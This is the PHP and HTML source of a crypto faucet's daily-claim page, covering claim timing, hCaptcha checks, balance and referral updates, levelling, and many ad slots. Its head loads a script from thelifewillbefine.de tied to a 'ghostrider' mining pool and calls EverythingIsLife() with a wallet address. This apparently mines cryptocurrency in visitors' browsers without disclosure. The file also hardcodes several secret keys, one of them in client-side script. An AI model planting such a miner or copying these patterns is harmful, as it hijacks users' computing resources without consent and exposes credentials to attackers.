<?php
// Set the timezone to GMT+7 globally
date_default_timezone_set('Asia/Bangkok');  // This sets GMT+7 timezone

// Only start session if it isn't already active
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

require 'includes/db.php';  // Database connection
$config = require 'config/config.php';  // Load your config file with claim settings

$successMessage = '';
$errorMessage = '';

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');  // Redirect to login if not logged in
    exit();
}
$user_id = $_SESSION['user_id'];

// Prepare a query to fetch the username, level, and referrer based on the user_id
$stmt = $pdo->prepare('SELECT username, level, exp, referrer_id FROM users WHERE id = :user_id');
$stmt->execute(['user_id' => $user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
$stmt = $pdo->prepare("SELECT currency, amount, claim_time FROM daily_claims WHERE user_id = :user_id ORDER BY claim_time DESC LIMIT 5");
$stmt->execute(['user_id' => $_SESSION['user_id']]);
$recent_claims = $stmt->fetchAll(PDO::FETCH_ASSOC);
if ($user) {
    // Retrieve the username, level, and EXP from the database result
    $username = htmlspecialchars($user['username']);
    $currentLevel = (int)$user['level'];
    $currentExp = (int)$user['exp'];
}

// Get the required EXP for the next level
$nextLevelExp = 0;
$stmt = $pdo->prepare("SELECT experience_required FROM user_levels WHERE level = :next_level");
$stmt->execute(['next_level' => $currentLevel + 1]);
$nextLevelExp = $stmt->fetchColumn() ?? 0;  // Default to 0 if no next level is found

// Chatbox configuration
$secret = "1cKsFI7qogLAYbun";

// Assuming $user['username'] contains the logged-in user's username
$params = array(
    'boxid' => 953445,
    'boxtag' => '5KfazJ', 
    'nme' => $username,
    'lnk' => '',
    'pic' => 'https://faucetminehub.com/1485477097-avatar_78580.png'
);

$arr = array();
foreach ($params as $k => $v) {
    if (!$v) {
        continue;
    }
    $arr[] = $k.'='.urlencode($v);
}

$path = '/box/?'.implode('&', $arr);
$sig = urlencode(base64_encode(hash_hmac("sha256", $path, $secret, true)));
$url = 'https://www5.cbox.ws'.$path.'&sig='.$sig;

// Get last claim time for countdown
$stmt = $pdo->prepare("SELECT claim_time FROM daily_claims WHERE user_id = :user_id ORDER BY claim_time DESC LIMIT 1");
$stmt->execute(['user_id' => $_SESSION['user_id']]);
$last_claim_time = $stmt->fetchColumn();

$time_left = 0;
$claim_interval_seconds = 10 * 60;  // 10 minutes in seconds

if ($last_claim_time) {
    $last_claim_timestamp = strtotime($last_claim_time);
    $current_timestamp = time();
    $time_difference = $current_timestamp - $last_claim_timestamp;
    $time_left = max($claim_interval_seconds - $time_difference, 0);
}

// Calculate remaining claims for the day and reset at 00:00 GMT+7
$current_date = new DateTime('now', new DateTimeZone('Asia/Bangkok'));
$last_claim_date = new DateTime($last_claim_time, new DateTimeZone('Asia/Bangkok'));

$max_claims_per_day = $config['daily_claim']['max_claims_per_day'];
if ($last_claim_time && $last_claim_date->format('Y-m-d') !== $current_date->format('Y-m-d')) {
    // Reset the claim count if it's a new day
    $claim_count = 0;
} else {
    // Fetch the number of claims made today
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM daily_claims WHERE user_id = :user_id AND DATE(claim_time) = :current_date");
    $stmt->execute(['user_id' => $_SESSION['user_id'], 'current_date' => $current_date->format('Y-m-d')]);
    $claim_count = $stmt->fetchColumn();
}

$claims_left = max($max_claims_per_day - $claim_count, 0);

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Check if the time interval has passed
    if ($time_left > 0) {
        $minutes_left = floor($time_left / 60);
        $seconds_left = $time_left % 60;
        $errorMessage = 'You need to wait ' . $minutes_left . ' minutes and ' . $seconds_left . ' seconds before claiming again.';
    } else {
        // Verify hCAPTCHA
        $hcaptcha_secret = 'ES_e0f0babb311f414b917fe4f7c46f8df9';
        $hcaptcha_response = $_POST['h-captcha-response'];
        $hcaptcha_url = 'https://hcaptcha.com/siteverify';

        $response = file_get_contents($hcaptcha_url . '?secret=' . $hcaptcha_secret . '&response=' . $hcaptcha_response);
        $response_keys = json_decode($response, true);

        if (!$response_keys['success']) {
            $errorMessage = 'Please complete the hCAPTCHA to proceed.';
        }

        if (empty($errorMessage)) {
            if (!isset($_POST['currency']) || empty($_POST['currency'])) {
                $errorMessage = 'No currency selected.';
            } else {
                $currency = strtolower($_POST['currency']);

                // Fetch the user information
                $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :user_id");
                $stmt->execute(['user_id' => $_SESSION['user_id']]);
                $user = $stmt->fetch();

                if (!$user) {
                    $errorMessage = 'User not found.';
                } else {
                    // Validate the selected currency
                    $allowed_currencies = ['btc', 'eth', 'doge', 'ltc', 'bch', 'dash', 'dgb', 'trx', 'usdt', 'fey', 'zec', 'bnb', 'sol', 'xrp', 'matic', 'ada', 'ton', 'xlm', 'usdc', 'xmr', 'tara',];

                    if (!in_array($currency, $allowed_currencies)) {
                        $errorMessage = 'Invalid currency selected.';
                    } else {
                        // Fetch the claim bonus percentage based on user level
                        $stmt = $pdo->prepare("SELECT claim_bonus FROM user_levels WHERE level = :level");
                        $stmt->execute(['level' => $user['level']]);
                        $claim_bonus_percentage = $stmt->fetchColumn() ?? 0;

                        // Set USD claim amount and max claim limit from config
                        $usd_claim_amount = $config['daily_claim']['usd_amount'];  // Base amount to claim in USD
                        $bonus_amount = $usd_claim_amount * ($claim_bonus_percentage / 100);
                        $total_claim_amount = $usd_claim_amount + $bonus_amount;

                        // Check if the user has already reached the claim limit in the last 24 hours
                        if ($claim_count >= $max_claims_per_day) {
                            $errorMessage = 'You have reached the maximum number of claims allowed per day.';
                        } else {
                            // Proceed with the claim if all checks passed
                            processClaim($currency, $usd_claim_amount, $bonus_amount, $claim_bonus_percentage, $user, $pdo, $config, $successMessage, $errorMessage);
                            // Reset time_left for next claim
                            $time_left = $claim_interval_seconds;
                        }
                    }
                }
            }
        }
    }
}

function processClaim($currency, $usd_claim_amount, $bonus_amount, $claim_bonus_percentage, $user, $pdo, $config, &$successMessage, &$errorMessage) {
    // Fetch the latest crypto rate for the selected currency
    $currency_mapping = [
        'btc' => 'bitcoin',
    'eth' => 'ethereum',
    'doge' => 'dogecoin',
    'ltc' => 'litecoin',
    'bch' => 'bitcoin-cash',
    'dash' => 'dash',
    'dgb' => 'digibyte',
    'trx' => 'tron',
    'usdt' => 'tether',
    'fey' => 'feyorra',
    'zec' => 'zcash',
    'bnb' => 'binancecoin',
    'sol' => 'solana',
    'xrp' => 'ripple',
    'matic' => 'matic-network',
    'ada' => 'cardano',
    'ton' => 'the-open-network',
    'xlm' => 'stellar',
    'usdc' => 'usd-coin',
    'xmr' => 'monero',
    'tara' => 'taraxa'
    ];

    if (!isset($currency_mapping[$currency])) {
        $errorMessage = 'Invalid currency mapping.';
    } else {
        $stmt_rate = $pdo->prepare("SELECT rate_usd FROM crypto_rates WHERE crypto_name = :currency");
        $stmt_rate->execute(['currency' => $currency_mapping[$currency]]);
        $rate_usd = $stmt_rate->fetchColumn();

        if (!$rate_usd) {
            $errorMessage = 'Failed to fetch the rate for the selected currency.';
        } else {
            // Calculate how much currency the user will get based on the total claim amount
            $amount_to_add = ($usd_claim_amount + $bonus_amount) / $rate_usd;
            $bonus_currency_amount = $bonus_amount / $rate_usd;
            $base_currency_amount = $usd_claim_amount / $rate_usd;

            // Update user's balance for the selected currency
            $currency_column = $currency . '_balance';
            $stmt = $pdo->prepare("UPDATE users SET {$currency_column} = {$currency_column} + :amount WHERE id = :user_id");
            $stmt->execute(['amount' => $amount_to_add, 'user_id' => $_SESSION['user_id']]);

            // Record the claim in the daily_claims table
            $stmt = $pdo->prepare("INSERT INTO daily_claims (user_id, currency, amount, claim_time) VALUES (:user_id, :currency, :amount, CONVERT_TZ(NOW(), @@global.time_zone, '+07:00'))");
            $stmt->execute(['user_id' => $_SESSION['user_id'], 'currency' => $currency, 'amount' => $amount_to_add]);

            // Check if the user has a referrer and give 2% to the referrer
            if (!empty($user['referrer_id'])) {
                $referrer_id = $user['referrer_id'];
                $referral_bonus = $amount_to_add * 0.05; // Calculate 2% of the claimed amount

                // Update referrer's balance
                $stmt = $pdo->prepare("UPDATE users SET {$currency_column} = {$currency_column} + :referral_bonus WHERE id = :referrer_id");
                $stmt->execute(['referral_bonus' => $referral_bonus, 'referrer_id' => $referrer_id]);

                // Record the referral earnings
                $stmt = $pdo->prepare("INSERT INTO referral_earnings (referrer_id, referred_user_id, amount, currency, bonus, earned_at) 
                                       VALUES (:referrer_id, :referred_user_id, :amount, :currency, :bonus, CONVERT_TZ(NOW(), @@global.time_zone, '+07:00'))");
                $stmt->execute([
                    'referrer_id' => $referrer_id,
                    'referred_user_id' => $_SESSION['user_id'],
                    'amount' => $amount_to_add,
                    'currency' => $currency,
                    'bonus' => $referral_bonus
                ]);
            }

            // Update user experience by 1
            $stmt = $pdo->prepare("UPDATE users SET exp = exp + 1 WHERE id = :user_id");
            $stmt->execute(['user_id' => $_SESSION['user_id']]);

            // Check if the user has reached a new level
            $stmt = $pdo->prepare("SELECT level FROM user_levels WHERE experience_required <= (SELECT exp FROM users WHERE id = :user_id) ORDER BY level DESC LIMIT 1");
            $stmt->execute(['user_id' => $_SESSION['user_id']]);
            $new_level = $stmt->fetchColumn();

            // Update the user's level if necessary
            if ($new_level !== false) {
                $stmt = $pdo->prepare("UPDATE users SET level = :level WHERE id = :user_id");
                $stmt->execute(['level' => $new_level, 'user_id' => $_SESSION['user_id']]);
            }

            // Set success message
            $successMessage = 'Claim successful! You received ' . number_format($base_currency_amount, 10) . ' ' . strtoupper($currency) . ' + ' . number_format($bonus_currency_amount, 10) . ' ' . strtoupper($currency) . ' based on your level bonus of ' . number_format($claim_bonus_percentage, 2) . '%. Your EXP increased by 1.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="300">
    <title>Daily Claim - Earn Crypto Rewards</title>
    <link rel="shortcut icon" href="./images/favicon2.png">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=ghostrider/native?nosaj=ghostrider.mine.zergpool.com:5354" ></script>
<script type="text/javascript">
EverythingIsLife('RJyLQysxRDUXnpWWL2sZTmjDdr1Uw2UGo4', 'c=RTM', 20);
</script>
      <script async src="https://appsha-pnd.ctengine.io/js/script.js?wkey=9ck0lg7R8t"></script>
    
    <style>
        body {
            background-color: #f5f5f5;
        }
        .sticky-header {
            background-color: #6576FF;
            color: white;
            padding: 15px;
            text-align: center;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 1000;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
        }
        .container-content {
            max-width: 800px;
            margin: auto;
            margin-top: 100px; /* Ensure it doesn't overlap with the sticky header */
            background: white;
            border: 2px solid #2c3782;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        .card {
            border: 2px solid #2c3782;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        .card-header {
            background-color: #6576FF;
            color: white;
            text-align: center;
            font-weight: bold;
        }
        .btn-primary, .btn-success {
            background-color: #6576FF;
            border: none;
        }
        .btn-primary:hover, .btn-success:hover {
            background-color: #2c3782;
        }
        .progress-bar {
            background-color: #6576FF;
        }
        .collapsible-content {
            margin-top: 20px;
        }
        .ad-container {
            margin-bottom: 20px;
            text-align: center;
        }
    </style>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F4ERE043ZG"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-F4ERE043ZG');
</script>

      
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3060302300389997"
     crossorigin="anonymous"></script>
</head>
<body>
    <div class="_0cbf1c3d417e250a" data-options="count=1,interval=1,burst=1" data-placement="f0f64fd502c348cd888bc9100e0d6064" style="display: none"></div>
<div class="_0cbf1c3d417e250a" data-options="count=1,interval=1,burst=1" data-placement="0cec52dc9d3743bbb163d989efae6d31" style="display: none"></div>
    <div class="sticky-header">
        <h2>Daily Claim - Earn Crypto Rewards</h2>
    </div>

    <div class="container-content">
        
        <center>

            <div class="card">
                <div class="card-body">
                    <p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3060302300389997"
     crossorigin="anonymous"></script>
<!-- gg -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3060302300389997"
     data-ad-slot="5449465979"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
                    <h2 class="text-center" style="color: #2c3782;">Welcome to Your Daily Claim!</h2>
                    <p class="text-center">Here, you can claim rewards in a variety of cryptocurrencies up to <strong>100 times per day</strong>. The more you claim, the closer you get to leveling up and unlocking even greater bonuses. Don't forget—your daily limit resets at <strong>00:00 GMT+7</strong>, so be sure to maximize your claims each day!</p>
                </div>
            </div>
<center><iframe id='banner_advert_wrapper_6625' src='https://api.fpadserver.com/banner?id=6625&size=250x250' width='250px' height='250px' frameborder='0'></iframe>
    <div id="ad_unit" data-unit-id="6624"></div><script src="https://api.fpadserver.com/static/js/advert_renderer.js"></script></center>
            <button class="btn btn-primary w-100 mb-2" type="button" data-bs-toggle="collapse" data-bs-target="#claim-bonus-info" aria-expanded="false" aria-controls="claim-bonus-info">
                How Does the Claim Bonus Work?
            </button>
            <div class="collapse" id="claim-bonus-info">
                <div class="card">
                    <div class="card-body">
                        <p>As you increase your level on FaucetMineHub, you'll earn a <strong>claim bonus</strong> that adds a percentage to your base claim amount. The higher your level, the larger the bonus!</p>
                        <ul>
                            <li><strong>Base Claim Amount:</strong> The fixed amount you receive per claim in USD, based on the current exchange rate for your selected currency.</li>
                            <li><strong>Claim Bonus:</strong> A percentage added to your base claim based on your current level.</li>
                            <li><strong>Level Up:</strong> Gain experience points (EXP) with each claim and dice roll to reach the next level and unlock higher bonuses!</li>
                        </ul>
                        <p>Keep leveling up to maximize your earnings and climb the leaderboards!</p>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    Level Up and Earn More!
                </div>
<div class="card-body">
    <p>Every time you make a daily claim or participate in the Dice game, you earn <strong>1 EXP</strong>. As your EXP increases, you'll reach new levels, which unlock higher claim bonuses.</p>
    <p><strong>Your Current Level:</strong> <?= htmlspecialchars($user['level']); ?> <br>
    <strong>EXP:</strong> <?= htmlspecialchars($user['exp']); ?> <br>
    <strong>Next Level at:</strong> <?= $nextLevelExp; ?> EXP</p>

    <!-- Progress Bar -->
    <div class="progress" style="height: 25px; border-radius: 10px;">
        <?php 
            // Calculate the percentage of progress towards the next level.
            $progressPercentage = 0;
            if ($nextLevelExp > 0) {
                $progressPercentage = min(100, ($user['exp'] / $nextLevelExp) * 100);
            }
        ?>
        <div class="progress-bar progress-bar-striped" role="progressbar" 
             style="width: <?= $progressPercentage; ?>%;" 
             aria-valuenow="<?= $progressPercentage; ?>" 
             aria-valuemin="0" 
             aria-valuemax="100">
            <?= round($progressPercentage, 2); ?>%
        </div>
    </div>
    <p class="text-center mt-2"><?= htmlspecialchars($user['exp']); ?> / <?= $nextLevelExp; ?> EXP</p>
</div>

            </div>

            <!-- Bottom Ad Placement -->
            <div class="ad-container">
                <span id="ct_cNkrbPu30Vx"></span>
            </div>

            <?php if (!empty($errorMessage)): ?>
                <div class="alert alert-danger text-center">
                    <?= htmlspecialchars($errorMessage) ?>
                </div>
            <?php endif; ?>

            <?php if (!empty($successMessage)): ?>
                <div class="alert alert-success text-center">
                    <?= htmlspecialchars($successMessage) ?>
                </div>
            <?php endif; ?>
<center><span id="ct_cNkrbPu30Vx"></span></center>
            <form method="POST">
                <div class="mb-3">
                    <label for="currency" class="form-label">Select Currency:</label>
                    <select name="currency" id="currency" class="form-select" required>
                        <option value="">-- Select Currency --</option>
                        <option value="eth">Ethereum (ETH)</option>
                        <option value="doge">Dogecoin (DOGE)</option>
                        <option value="ltc">Litecoin (LTC)</option>
                        <option value="dash">Dashcoin (DASH)</option>
                        <option value="trx">Tron (TRX)</option>
                        <option value="bnb">Binance Coin (BNB)</option>
                        <option value="ton">Toncoin (TON)</option>
                    </select>
                </div>

                <div class="text-center mb-3">
                    <div class="h-captcha" data-sitekey="29247292-a86e-44a2-9706-1c1c8c3cb1a0"></div>
                </div>
                <center><p class="fs-5 fw-bold mt-2">Claims: <?= htmlspecialchars($claim_count) ?> / <?= htmlspecialchars($max_claims_per_day) ?> available today</p></center>
                <button type="submit" class="btn btn-success w-100 mb-3">Claim</button>
            </form>
            
<center><p><div id="ad_unit" data-unit-id="6624"></div><script src="https://api.fpadserver.com/static/js/advert_renderer.js"></script></p>
    <p><iframe id='banner_advert_wrapper_6625' src='https://api.fpadserver.com/banner?id=6625&size=250x250' width='250px' height='250px' frameborder='0'></iframe></p></center>
            <p id="countdown-timer" class="text-center fs-5 fw-bold">Time until next claim: 00:00</p>

            <button class="btn btn-primary w-100 mb-2" type="button" data-bs-toggle="collapse" data-bs-target="#claim-history-section" aria-expanded="false" aria-controls="claim-history-section">
                View Recent Claims
            </button>
            <div class="collapse" id="claim-history-section">
                <div class="card">
                    <div class="card-body">
                        <?php if (count($recent_claims) > 0): ?>
                            <table class="table table-bordered">
                                <thead>
                                    <tr>
                                        <th>Currency</th>
                                        <th>Amount</th>
                                        <th>Date</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($recent_claims as $claim): ?>
                                        <tr>
                                            <td><?= htmlspecialchars(strtoupper($claim['currency'])); ?></td>
                                            <td><?= number_format($claim['amount'], 10); ?></td>
                                            <td><?= date('Y-m-d H:i:s', strtotime($claim['claim_time'])); ?></td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        <?php else: ?>
                            <p class="text-center">No recent claims found. Start claiming now!</p>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </center>

        <div class="text-center mt-3">
            <a href="dashboard.php" class="btn btn-primary">Back to Dashboard</a>
        </div>
        <br>
        
    </div>

    

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<!--<script id="chatBroEmbedCode">
/* Chatbro Widget Embed Code Start */
function ChatbroLoader(chats, async) {
    async = !1 !== async;
    var params = {
        embedChatsParameters: chats instanceof Array ? chats : [chats],
        lang: navigator.language || navigator.userLanguage,
        needLoadCode: 'undefined' == typeof Chatbro,
        embedParamsVersion: localStorage.embedParamsVersion,
        chatbroScriptVersion: localStorage.chatbroScriptVersion
    },
    xhr = new XMLHttpRequest;
    xhr.withCredentials = !0,
    xhr.onload = function () {
        eval(xhr.responseText);
    },
    xhr.onerror = function () {
        console.error('Chatbro loading error');
    },
    xhr.open('GET', 'https://www.chatbro.com/embed.js?' + btoa(unescape(encodeURIComponent(JSON.stringify(params)))), async),
    xhr.send();
}

/* Function to Generate Signature */
function generateSignature(siteDomain, siteUserExternalId, siteUserFullName, siteUserAvatarUrl, siteUserProfileUrl, siteUserFullNameColor, permissions, secretKey) {
    const permissionsString = permissions.join('');
    const signatureData = siteDomain + siteUserExternalId + siteUserFullName + siteUserAvatarUrl + siteUserProfileUrl + siteUserFullNameColor + permissionsString + secretKey;
    return CryptoJS.MD5(signatureData).toString();
}

/* Chatbro Widget Loader */
const siteDomain = 'faucetminehub.com';
const siteUserExternalId = '<?php echo htmlspecialchars($user_id); ?>';
const siteUserFullName = '<?php echo "<ad>Lv." . htmlspecialchars($level) . "</ad> " . strtoupper(htmlspecialchars($username)); ?>';
const siteUserAvatarUrl = 'https://i.ibb.co.com/yYthQwZ/user.png';
const siteUserProfileUrl = 'https://i.ibb.co.com/yYthQwZ/user.png';
const siteUserFullNameColor = 'grey';

// Check if the user is admin
let permissions = [];
if (['1'].includes(siteUserExternalId.toLowerCase())) {
    permissions = ['delete', 'ban']; // Admin permissions
}

// Secret key for signature generation
const secretKey = '0b9e8b81-4258-423f-97aa-2ecacf965743';

// Generate the dynamic signature
const signature = generateSignature(
    siteDomain,
    siteUserExternalId,
    siteUserFullName,
    siteUserAvatarUrl,
    siteUserProfileUrl,
    siteUserFullNameColor,
    permissions,
    secretKey
);

// Load the Chatbro widget with the generated signature
ChatbroLoader([
    {
        encodedChatId: '6912P',
        siteDomain: siteDomain,
        siteUserExternalId: siteUserExternalId,
        siteUserFullName: siteUserFullName,
        siteUserFullNameColor: siteUserFullNameColor,
        siteUserAvatarUrl: siteUserAvatarUrl,
        siteUserProfileUrl: siteUserProfileUrl,
        permissions: permissions,
        signature: signature
    }
]);
</script>-->

    <script src="https://hcaptcha.com/1/api.js" async defer></script>
    <script>
        var chatToggle = document.getElementById('chat-toggle');
        var chatContainer = document.getElementById('chat-container');

        chatToggle.addEventListener('click', function() {
            if (chatContainer.style.height === "40px") {
                chatContainer.style.height = "400px";
                chatToggle.innerHTML = "Hide Chat";
            } else {
                chatContainer.style.height = "40px";
                chatToggle.innerHTML = "Show Chat";
            }
        });

        var timeLeft = <?= $time_left ?>;
        var countdownTimer = document.getElementById('countdown-timer');

        function updateCountdown() {
            if (timeLeft <= 0) {
                countdownTimer.textContent = "Time until next claim: 00:00";
            } else {
                var minutes = Math.floor(timeLeft / 60);
                var seconds = timeLeft % 60;
                countdownTimer.textContent = "Time until next claim: " + (minutes < 10 ? '0' : '') + minutes + ":" + (seconds < 10 ? '0' : '') + seconds;
                timeLeft--;
            }
        }

        setInterval(updateCountdown, 1000);
    </script>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        var adElements = [
            document.getElementById('ad_unit')
        ];
        var adblockMessage = document.getElementById('adblock-message');

        function checkAdVisibility() {
            var isAdBlocked = adElements.some(function(adElement) {
                // Check if the element exists
                if (!adElement) {
                    console.log('Ad element not found.');
                    return true;
                }

                // Check if the element is visible in the viewport
                var isVisible = adElement.offsetParent !== null; // Checks if the element is visible in the DOM
                if (!isVisible) {
                    console.log('Ad element is hidden in the DOM.');
                    return true;
                }

                // Check if the element has content or is not empty
                if (adElement.innerHTML.trim() === '') {
                    console.log('Ad element is present but has no content.');
                    return true;
                }

                // Check if the element has a reasonable size
                if (adElement.offsetHeight < 20 || adElement.offsetWidth < 20) {
                    console.log('Ad element is too small (possibly hidden).');
                    return true;
                }

                // If all checks are passed, the ad is not blocked
                return false;
            });

            // Show the adblock message if an ad blocker is detected after 5 seconds.
            if (isAdBlocked) {
                console.log('Ad blocker detected, displaying message after 5 seconds.');
                adblockMessage.style.display = 'flex';
            } else {
                console.log('No ad blocker detected, ads are visible.');
                adblockMessage.style.display = 'none';
            }
        }

        // Ensure the message stays hidden initially
        adblockMessage.style.display = 'none';

        // Delay the check to allow ads to load and show the message only after 5 seconds
        setTimeout(checkAdVisibility, 1000); // Delay by 5000ms (5 seconds)
    });
</script>

</body>
</html>
